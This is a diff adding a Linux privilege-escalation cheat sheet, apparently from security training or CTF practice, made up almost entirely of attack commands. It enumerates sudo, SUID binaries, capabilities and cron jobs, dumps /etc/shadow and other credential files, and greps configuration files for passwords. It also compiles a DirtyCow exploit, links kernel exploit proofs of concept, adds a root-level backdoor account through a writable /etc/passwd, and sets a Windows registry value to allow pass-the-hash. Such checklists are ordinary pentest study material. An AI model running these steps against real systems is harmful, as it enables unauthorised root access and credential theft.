@@ -1,0 +1,68 @@
+﻿Check for sudo privileges
+sudo -l
+
+Check for SUID privileges
+find / -perm 4000 -type f 2>/dev/null
+
+Check for capabilities
+getcap -r / 2>/dev/null
+
+Check for active Cronjobs
+crontab -l
+cat /etc/crontab
+
+Check for pre-existing SSH keys
+ls ~/.ssh
+
+Check the OS and look for known exploits
+(cat /proc/version || uname -a) 2>/dev/null
+
+Check the kernel version and look for known exploits
+uname -a
+
+List of known kernel exploits:
+https://github.com/lucyoa/kernel-exploits
+Kernel exploits we know are good:
+OverlayFS: Ubuntu 20.10, 2004 LTS, 19.04, 18.04 LTS, 16.04 LTS, 14.04 ESM
+https://github.com/briskets/CVE-2021-3493
+DirtyCow: Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+    echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
+    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil    
+
+Check for interesting information, passwords, API keys stored in env variables
+(env || set) 2>/dev/null
+
+Check for what is mounted/unmounted
+ls /dev 2>/dev/null | grep -i "sd"
+cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
+
+Check what is contained in these files/folders
+ls -l /etc/profile /etc/profile.d/
+cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+
+cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
+
+ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root 2>/dev/null
+
+Writable /etc/passwd:
+mkpasswd -m SHA-512 cyber@uci
+In /etc/passwd: hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+
+Search:
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+Enable Restricted Admin Mode to allow Pass The Hash
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+Tools
+Cracked tools to automate enumeration:
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+https://github.com/DominicBreuker/pspy
+https://github.com/huntergregal/mimipenguin
+https://github.com/rebootuser/LinEnum
+https://github.com/spencerdodd/kernelpop
